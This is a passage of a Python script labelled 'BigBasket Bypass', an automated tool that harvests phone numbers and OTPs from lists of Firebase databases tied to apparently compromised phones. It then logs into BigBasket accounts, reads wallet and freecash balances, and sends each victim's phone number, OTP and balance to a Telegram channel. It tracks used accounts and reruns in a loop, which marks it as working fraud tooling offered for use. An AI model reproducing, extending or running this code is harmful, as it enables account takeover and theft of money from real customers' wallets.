            log(f"   {C.ok('✅ OK')} {phone} | "
                f"{C.money('₹'+str(wb))}+{C.money('₹'+str(fb))}"
                f"={C.head('₹'+str(total_cash))} → {C.GREEN}TG{C.RESET}")
            await send_telegram_alert(
                fb_url=fb_url, device_id=device_id, phone=phone,
                client=client, wallet=wb, freecash=fb, otp=otp)
        else:
            log(f"   {C.ok('✅ OK')} {phone} | {C.dim('₹0 balance → skip TG')}")

        return {"phone": phone, "device_id": device_id, "success": True,
                "wallet": wb, "freecash": fb, "total": total_cash, "otp": otp}
    except Exception as e:
        log(f"   {C.err('✗ Error')} {phone}: {e}")
        return {"phone": phone, "device_id": device_id,
                "success": False, "error": str(e)[:120]}
    finally:
        try:
            client.session.close()
        except Exception:
            pass


async def process_device_all_phones(device_id: str, device_info: dict,
                                     fb_url: str, dev_idx: int, dev_total: int):
    phones_all = device_info.get("phones", [])
    fresh = [p for p in phones_all if not USED.is_used(device_id, p)]
    skipped = [p for p in phones_all if USED.is_used(device_id, p)]
    name = device_info.get("name", device_id[:12])

    log(f"\n{C.head('━' * 78)}")
    log(f"{C.head(f'📱 DEVICE {dev_idx}/{dev_total}')} {C.dev(name)} "
        f"→ {C.BOLD}{len(phones_all)}{C.RESET} {C.info('phone(s)')}")
    if skipped:
        log(f"   {C.dim(f'⏭ already used: {len(skipped)}')}")
    if fresh:
        log(f"   {C.YELLOW}fresh (sequential): {', '.join(fresh)}{C.RESET}")
    log(C.head('━' * 78))

    if not fresh:
        log(f"{C.dim('   All phones already used, skipping device.')}")
        return []

    results = []
    for i, phone in enumerate(fresh, 1):
        log(f"\n   {C.info(f'▶ Phone {i}/{len(fresh)}')} {C.BOLD}{phone}{C.RESET}")
        r = await _process_one_phone(device_id, phone, fb_url)
        results.append(r)

    return results


async def _process_devices_in_batches(devices_list: List[Tuple[str, dict]],
                                       fb_url: str) -> List[dict]:
    all_results: List[dict] = []
    total_devices = len(devices_list)

    for batch_start in range(0, total_devices, DEVICES_PARALLEL):
        batch = devices_list[batch_start:batch_start + DEVICES_PARALLEL]
        batch_end = batch_start + len(batch)
        log(f"\n{C.head('🔥' * 30)}")
        log(f"{C.head(f'BATCH {batch_start+1}-{batch_end}/{total_devices}')} "
            f"{C.dim('→')} {C.BOLD}{len(batch)}{C.RESET} {C.dim('devices parallel')}")
        log(f"{C.head('🔥' * 30)}")

        tasks = []
        for i, (did, dinfo) in enumerate(batch):
            dev_num = batch_start + i + 1
            tasks.append(asyncio.create_task(
                process_device_all_phones(did, dinfo, fb_url,
                                            dev_num, total_devices)))

        batch_results = await asyncio.gather(*tasks, return_exceptions=True)
        for r in batch_results:
            if isinstance(r, Exception):
                logger.error(f"batch device failed: {r}")
                continue
            if r:
                all_results.extend(r)

    return all_results


# ============================================================
# MAIN FLOW
# ============================================================
def print_banner():
    banner = r"""
╔══════════════════════════════════════════════════════════════════════════╗
║   BigBasket Bypass — AUTO MODE — RENDER-SAFE                             ║
╚══════════════════════════════════════════════════════════════════════════╝
"""
    log(f"{C.MAGENTA}{C.BOLD}{banner}{C.RESET}")


def _fmt_scan_row(idx, url, s):
    short = url.replace("https://", "").replace("http://", "")
    if len(short) > 58:
        short = short[:55] + "..."
    idx_str = f"{C.YELLOW}{idx:<4}{C.RESET}"
    url_str = f"{C.dev(short):<58}"

    if isinstance(s, Exception):
        return f"{idx_str} {url_str} {C.err('ERR'):<12} {C.err('ERR'):<12} {C.err('-')}"

    if s["status"] != FBStatus.SUCCESS:
        return f"{idx_str} {url_str} {'-':<12} {'-':<12} {C.err(f'[{s["status"]}]')}"

    online = C.ok(str(s['online']))
    offline = C.dim(str(s['offline']))
    total = C.money(str(s['total']))
    return (f"{idx_str} {url_str} "
            f"{pad(online, 12)} {pad(offline, 12)} {pad(total, 10)} "
            f"{C.GREEN}{C.BOLD}✔{C.RESET}")


async def scan_all_streaming(urls: List[str]) -> List[Any]:
    log("\n" + C.head("=" * 100))
    log(f"{C.BOLD}{'#':<4} {'FIREBASE URL':<58} "
        f"{'ONLINE':<12} {'OFFLINE':<12} {'TOTAL':<10} STATUS{C.RESET}")
    log(C.head("=" * 100))

    results: List[Any] = [None] * len(urls)
    sem = asyncio.Semaphore(FB_SCAN_CONCURRENCY)

    async def _bound(idx, url):
        async with sem:
            try:
                r = await scan_firebase_summary(url)
            except Exception as e:
                r = e
            return idx, r

    tasks = [asyncio.create_task(_bound(i, u)) for i, u in enumerate(urls)]

    completed = 0
    t0 = time.time()
    for task in tasks:
        idx, r = await task
        results[idx] = r
        completed += 1
        log(_fmt_scan_row(idx + 1, urls[idx], r))

    log(C.head("=" * 100))
    log(f"{C.dim(f'⚡ Scanned {completed} firebase(s) in {time.time()-t0:.2f}s')}")
    return results


async def process_firebase(fb_url, tag_label: str = ""):
    label = f"{C.dev(fb_url)}" if not tag_label else f"{C.YELLOW}[{tag_label}]{C.RESET} {C.dev(fb_url)}"
    log(f"\n{C.info('🔎 Fetching online devices + all phones from')} {label}...")
    t0 = time.time()
    online = await get_online_devices(fb_url)
    if not online:
        log(C.err("❌ No online devices found."))
        return

    devices_with_phones = {cid: i for cid, i in online.items() if i.get("phones")}
    total_phones = sum(len(i["phones"]) for i in online.values())

    fresh_count = 0
    used_count = 0
    for cid, info in devices_with_phones.items():
        for p in info["phones"]:
            if USED.is_used(cid, p):
                used_count += 1
            else:
                fresh_count += 1

    log(f"\n{C.head('📊 Scan result:')} {C.dim(f'({time.time()-t0:.2f}s)')}")
    log(f"   {C.info('Online devices   :')} {C.BOLD}{len(online)}{C.RESET}")
    log(f"   {C.ok('✅ With phones    :')} {C.BOLD}{len(devices_with_phones)}{C.RESET}")
    log(f"   {C.head('📱 Total phones   :')} {C.BOLD}{total_phones}{C.RESET}")
    log(f"   {C.ok('🆕 Fresh phones   :')} {C.BOLD}{fresh_count}{C.RESET}")
    log(f"   {C.dim('⏭ Already used   :')} {C.BOLD}{used_count}{C.RESET}")
    log(f"   {C.dim('📁 used.json      :')} {C.BOLD}{USED.count()}{C.RESET}")

    if not devices_with_phones:
        log(C.err("\n❌ No devices have phone numbers."))
        return

    if fresh_count == 0:
        log(C.err("\n❌ All phones already used."))
        return

    log(f"\n{C.head(f'🚀 Starting bypass for {fresh_count} fresh phone(s)...')}")
    log(f"{C.warn(f'⏱  OTP wait: {OTP_WAIT_SECONDS}s | DEVICES_PARALLEL: {DEVICES_PARALLEL}')}")
    log(f"{C.info(f'🔁 Phones processed SEQUENTIALLY per device (fixes OTP mismatch)')}")
    log(C.dim("-" * 78))

    devices_list = list(devices_with_phones.items())
    t_start = time.time()
    results = await _process_devices_in_batches(devices_list, fb_url)

    success = 0
    failed = 0
    total_cash = 0
    sent_count = 0
    for r in results:
        if r and r.get("success"):
            success += 1
            t = r.get("total", 0)
            total_cash += t
            if t >= MIN_BALANCE_TO_SEND:
                sent_count += 1
        else:
            failed += 1

    elapsed = time.time() - t_start
    log("\n" + C.head("=" * 78))
    log(C.head(C.BOLD + "🏁 PROCESS COMPLETE" + C.RESET))
    log(C.head("=" * 78))
    log(f"   {C.ok('✅ Success    :')} {C.BOLD}{success}{C.RESET}")
    log(f"   {C.err('❌ Failed     :')} {C.BOLD}{failed}{C.RESET}")
    log(f"   {C.head('📤 Sent to TG :')} {C.BOLD}{sent_count}{C.RESET}")
    log(f"   {C.head('💰 Total Cash :')} {C.money('₹'+str(total_cash))}")
    log(f"   {C.head('💾 used.json  :')} {C.BOLD}{USED.count()}{C.RESET}")
    log(f"   {C.dim('⏱  Elapsed    :')} {C.dim(f'{elapsed:.2f}s')}")
    log(C.head("=" * 78))


async def process_multiple_firebases(chosen_urls: List[str]):
    t_all = time.time()
    for i, u in enumerate(chosen_urls, 1):
        log("\n" + C.head("━" * 78))
        log(f"{C.head(C.BOLD + f'🔥 FIREBASE {i}/{len(chosen_urls)}' + C.RESET)}")
        log(C.head("━" * 78))
        await process_firebase(u, tag_label=f"{i}/{len(chosen_urls)}")
    log("\n" + C.head("█" * 78))
    log(C.head(C.BOLD + f"🏆 GRAND TOTAL — {len(chosen_urls)} FIREBASE(S)" + C.RESET))
    log(C.head("█" * 78))
    log(f"   {C.dim('⏱  Total time :')} {C.dim(f'{time.time()-t_all:.2f}s')}")
    log(f"   {C.head('💾 used.json  :')} {C.BOLD}{USED.count()}{C.RESET}")


async def auto_run_once():
    urls = load_firebase_urls()
    if not urls:
        log(C.err(f"\n❌ No firebase URLs found in '{FIREBASE_FILE}'"))
        return False

    normalized = []
    for u in urls:
        n = normalize_fb_url(u)
        if n:
            normalized.append(n)
        else:
            log(C.warn(f"⚠️  Invalid firebase URL skipped: {u}"))
    urls = normalized
    if not urls:
        log(C.err("❌ No valid firebase URLs."))
        return False

    log(f"\n{C.info('📡 Scanning')} {C.BOLD}{len(urls)}{C.RESET} firebase(s)...")
    await scan_all_streaming(urls)

    log(f"\n{C.ok('✅ Auto-selected ALL')} {C.BOLD}{len(urls)}{C.RESET} firebase(s)")

    await process_multiple_firebases(urls)
    return True


def _signal_handler(signum, frame):
    log(C.warn(f"\n⚠️  Signal {signum} received — shutting down gracefully..."))
    sys.exit(0)


def main():
    signal.signal(signal.SIGTERM, _signal_handler)
    signal.signal(signal.SIGINT, _signal_handler)

    start_health_server()

    print_banner()
    log(f"\n{C.head('💾 Used Accounts Tracker')}")
    log(f"   {C.dim('File:')} {USED_FILE}")
    log(f"   {C.dim('Records:')} {C.BOLD}{USED.count()}{C.RESET}")
    log(f"   {C.dim('Devices parallel:')} {C.BOLD}{DEVICES_PARALLEL}{C.RESET}")
    log(f"   {C.dim('OTP wait:')} {C.BOLD}{OTP_WAIT_SECONDS}s{C.RESET}")
    log(f"   {C.dim('Health port:')} {C.BOLD}{HEALTH_PORT}{C.RESET}")
    log(f"   {C.dim('Mode:')} {C.ok('AUTO — SEQUENTIAL PHONES')}")

    while True:
        try:
            asyncio.run(auto_run_once())
        except KeyboardInterrupt:
            log(C.warn("\n⚠️  Interrupted."))
            break
        except SystemExit:
            raise
        except Exception as e:
            logger.error(f"auto_run_once crashed: {e}")

        if AUTO_RERUN_DELAY <= 0:
            break

        log(f"\n{C.info(f'🔁 Sleeping {AUTO_RERUN_DELAY}s before next loop...')}")
        try:
            time.sleep(AUTO_RERUN_DELAY)
        except KeyboardInterrupt:
            break


if __name__ == "__main__":
    main()